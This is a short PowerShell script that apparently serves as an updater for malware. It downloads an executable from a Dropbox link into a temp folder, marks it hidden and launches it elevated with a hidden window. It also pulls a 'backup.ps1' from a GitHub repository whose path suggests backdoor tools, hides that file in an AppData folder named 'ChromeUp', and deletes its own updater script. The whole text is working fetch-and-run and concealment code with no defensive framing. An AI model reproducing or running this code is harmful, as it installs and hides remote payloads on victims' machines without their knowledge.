#sleep
start-sleep 5

#change directory
cd $env:temp/sVBXKuz

#download new backup
Invoke-WebRequest -Uri "dl.dropboxusercontent.com/s/ktmct46mftulye1s7ka7j/wsappa-1.5.exe?rlkey=sfae0om54ct58a3cmgh3z4ndg&dl=0" -OutFile new_wsappa.exe

#remove old file
Remove-Item $env:temp/sVBXKuz/wsappa.exe

#sleep
start-sleep 2

#change name
Rename-Item new_wsappa.exe wsappa.exe

# Set "Hidden" attribute on the file
$filePath = Join-Path $env:temp\sVBXKuz "wsappa.exe"
$attr = [System.IO.FileAttributes]::Hidden
[System.IO.File]::SetAttributes($filePath, $attr)

#start new file
Start-Process -FilePath "wsappa.exe" -Verb RunAs -WindowStyle Hidden

#change directory
cd $env:appdata/ChromeUp/

#download new backup
$url = "https://raw.githubusercontent.com/blousekool/BBbdtools/main/bd/backup.ps1"
$response = Invoke-WebRequest -Uri $url
$response.Content | Set-Content -Path "backup.ps1"

# Set "Hidden" attribute on the file
$filePath = Join-Path $env:appdata\ChromeUp "backup.ps1"
$attr = [System.IO.FileAttributes]::Hidden
[System.IO.File]::SetAttributes($filePath, $attr)

#sleep
start-sleep 2

#clean uo
powershell.exe /c Remove-Item $env:temp/sVBXKuz/updater.ps1
